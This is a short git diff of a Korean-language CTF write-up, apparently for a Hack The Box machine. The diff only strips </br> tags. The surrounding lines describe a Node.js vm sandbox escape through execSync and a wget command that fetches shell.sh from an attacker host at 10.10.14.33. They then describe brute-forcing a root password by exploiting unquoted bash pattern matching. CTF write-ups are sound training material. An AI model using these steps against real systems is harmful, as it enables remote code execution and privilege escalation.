@@ -30,7 +30,7 @@ WebAssembly.compileStreaming(obj).catch(()=>{});
 vm.run(code);
 ```
 - execSync('')안에 실행할 코드를 넣는다.
-- python3 -m http.server 80 실행 후 wget http://10.10.14.33:80/shell.sh 를 넣어 쉘을 다운로드 시킨다.</br>
+- python3 -m http.server 80 실행 후 wget http://10.10.14.33:80/shell.sh 를 넣어 쉘을 다운로드 시킨다.
 
 ### shell.sh에
 ### #!/bin/bash
@@ -50,7 +50,7 @@ vm.run(code);
   - 스크립트 파일안에 pw를 검증하는 코드가 있는데 DB_PASS==USER_PASS에서 USER_PASS가 " " 안에 없을 경우 문자열로 인식하지 않고 pattern matching을 사용한다
   - 한 글자씩 비교하고 정규표현식으로 *를 넣어 패스워드를 비교한다
   - crack1.py를 만들고 python3 crack1.py로 실행하여 pw를 찾는다
-</br>  - 찾은 pw로 su root를 실행하여 root.txt를 찾는다
+  - 찾은 pw로 su root를 실행하여 root.txt를 찾는다
 
 ### 결론
 - nodejs 코드 실행기에서 샌드박스 이스케이프를 활용하여 코드를 실행
